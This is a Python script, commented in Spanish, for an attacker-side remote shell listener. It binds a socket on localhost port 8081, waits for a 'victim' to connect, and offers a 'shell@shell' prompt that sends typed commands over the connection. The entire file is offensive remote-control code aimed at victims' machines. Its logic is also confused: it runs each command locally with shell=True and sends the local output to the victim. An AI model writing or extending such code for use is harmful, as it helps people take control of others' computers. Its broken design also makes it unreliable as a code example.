import socket 
import subprocess

# Crear el servidor para que escuche
server = socket.socket()
server.bind(("localhost", 8081))
server.listen(1)

print("Esperando conexiones...")

# Bucle para esperar una víctima
while True:
    # Variables para aceptar las conexiones de las víctimas
    victima, direccion = server.accept()
    
    print(f"Conexion de: {direccion}")
    
    # Obtener el mensaje de la víctima, en binario
    msBinario = victima.recv(1024)
    
    # Codificar el mensaje
    msCodificado = msBinario.decode("ascii")
    
    # Si el mensaje es igual a "1", hacemos un bucle infinito
    if msCodificado == "1":
        while True:
            opciones = input("shell@shell: ")
            
            # Enviar a la víctima los mensajes codificados
            victima.send(opciones.encode("utf-8"))
            
            # Ejecutar el comando shell
            comando = subprocess.Popen(
                opciones,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True  # Para obtener texto en lugar de bytes
            )

            # Leer la salida del comando línea por línea
            for linea in comando.stdout:
                # Enviar cada línea de salida al cliente
                victima.send(linea.encode("utf-8"))

            # Leer la salida de errores, si la hay
            for linea in comando.stderr:
                # Enviar cada línea de salida de errores al cliente
                victima.send(linea.encode("utf-8"))
    else:
        print("Error...")
        break
